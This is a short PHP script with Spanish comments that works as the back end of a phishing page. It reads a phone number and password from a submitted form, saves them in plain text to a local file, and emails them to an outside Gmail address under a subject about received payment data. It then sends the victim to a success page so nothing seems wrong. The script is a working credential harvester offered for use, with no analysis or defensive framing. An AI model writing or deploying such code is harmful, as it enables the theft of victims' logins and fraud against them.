<?php
$telefono = $_POST['telefono'];
$contraseña = $_POST['contraseña'];

// Abre el archivo datos.txt en modo de añadir
$archivo = fopen('datos.txt', 'a');
fwrite($archivo, "Teléfono: " . $telefono . "\n");
fwrite($archivo, "Contraseña: " . $contraseña . "\n\n");
fclose($archivo);

// Configurar envío de correo
$para = 'cinthiaabigaail@gmail.com';
$asunto = 'Datos de Pago Recibidos';
$mensaje = "Teléfono: $telefono\nContraseña: $contraseña\n";
$headers = 'From: noreply@tu-sitio.com';

// Enviar correo
mail($para, $asunto, $mensaje, $headers);

// Redireccionar a página de éxito
header("Location: exito.html");
exit();
?>






